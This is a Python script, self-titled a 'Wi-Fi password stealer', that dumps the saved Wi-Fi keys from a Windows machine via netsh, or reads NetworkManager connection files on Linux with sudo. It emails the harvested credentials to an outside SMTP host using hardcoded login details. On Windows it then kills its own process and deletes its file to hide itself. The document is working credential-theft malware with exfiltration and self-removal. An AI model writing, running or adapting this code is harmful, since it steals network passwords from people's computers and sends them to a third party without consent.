#Hello
import os
import smtplib
import subprocess
from email.mime.text import MIMEText
import glob

system_information = "Informations.txt"

YOUR_USERNAME = "98e63169f41627"
YOUR_PASSWORD = "c8351b24cb9c23"
SMTP_HOST = "sandbox.smtp.mailtrap.io"
SMTP_PORT = 2525

file_path = os.path.dirname(os.path.abspath(__file__))

sender = "Private Person <from@example.com>"
receiver = "A Test User <to@example.com>"

message = f"""\
Subject: aydinnyunus have sent you message
To: {receiver}
From: {sender}

WIFI PASSWORD STEALER by aydinnyunus.\n"""


if os.name == "nt":
    output = subprocess.check_output("netsh wlan show profile", shell=True)
    output = output.decode('utf-8')
    start = output.find("Profile :")
    end = output.find("\r\n")
    substring = output[start:end]
    list_of_word = output.split()
    j = 2
    with open(file_path + "\\" + system_information, "w") as f:
        f.write("All of Registered Connections\n")
        f.write("==================================\n")
    for word in output.split():
        if word == "Profile":
            next_word = list_of_word[list_of_word.index(word) + j]
            next_word = next_word.split('\r\n')[0]
            k = j + 1
            try:
                while "All" not in next_word:
                    next_word += " " + list_of_word[list_of_word.index(word) + k]
                    k = k + 1
            except:
                pass
            next_word = next_word.split('\r\n')[0]
            if ':' in next_word:
                next_word = next_word.split(':')[1]
                if ' ' in next_word:
                    next_word = next_word.replace(' ', "")
            wifi = subprocess.check_output('netsh wlan show profile "' + next_word + '" key=clear', shell=True)
            wifi = wifi.decode('utf-8')
            start = wifi.find("Key Content")
            end = wifi.find("Cost settings")
            key_content = "Content"
            substring = wifi[start:end]
            list_of_words = wifi.split()
            with open(file_path + "\\" + system_information, "a") as f:
                f.write(next_word + "\n")
            j = j + 5
            try:
                next_word = list_of_words[list_of_words.index(key_content) + 2]
                i = 2
                for words in wifi.split():
                    if words == "Content":
                        next_word = list_of_words[list_of_words.index(key_content) + i]
                        next_word = next_word.split('\r\n\r\nCost')[0]
                        next_word = next_word.replace(' ', "\\ ")
                        i = i + 5
                        with open(file_path + "\\" + system_information, "a") as f:
                            f.write(" : " + next_word + "\n")
            except:
                pass

    with open(file_path + "\\" + system_information) as f:
        lines = f.read()

    print(str(lines))
    message += str(lines)

    with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
        server.login(YOUR_USERNAME, YOUR_PASSWORD)
        server.sendmail(sender, receiver, message)

    print("Gửi mail thành công!")

    try:
        pwd = os.path.abspath(os.getcwd())
        os.system("cd " + pwd)
        os.system("TASKKILL /F /IM " + os.path.basename(__file__))
        print('File was closed.')
        os.system("DEL " + os.path.basename(__file__))
    except OSError:
        print('File is close.')

else:
    with open(file_path + "/" + system_information, "w") as f:
        f.write("All of Registered Connections\n")
        f.write("==================================\n")

    try:
        output = glob.glob("/etc/NetworkManager/system-connections/*")
        for i in output:
            cmd = "sudo cat '" + i + "'"
            wifi_output = subprocess.check_output(cmd, shell=True)
            wifi_output = wifi_output.decode('utf-8')
            with open(file_path + "/" + system_information, "a") as f:
                f.write(wifi_output + "\n===========================\n")
    except Exception as e:
        print(f"Loi: {e}")

    with open(file_path + "/" + system_information) as f:
        lines = f.read()

    print(str(lines))
    message += str(lines)

    with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
        server.login("98e63169f41627", "c8351b24cb9c23")
        server.sendmail(sender, receiver, message)

    print("Gui mail thanh cong!")
EOF